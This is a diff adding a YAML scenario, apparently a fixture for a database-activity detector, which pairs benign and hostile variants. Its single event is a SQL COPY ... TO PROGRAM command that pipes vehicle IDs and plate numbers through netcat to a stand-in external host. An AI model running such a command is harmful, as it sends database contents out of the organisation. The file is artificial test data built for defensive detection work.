@@ -1,0 +1,30 @@
+scenario_id: gen_logistics_96_copy_to_program_ben_2738b
+family_id: gen_logistics_96_copy_to_program_fam_2738
+domain: logistics
+time_of_day: 01:35
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT vehicle_id, plate_number FROM vehicles WHERE depot_id = 'DP-02')
+      TO PROGRAM 'nc warehouse-sync.datasink.example 443'
+    connects_to:
+      ip: 198.51.100.89
+      port: 8080
+matched_pair_id: gen_logistics_96_copy_to_program_pair_2738
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
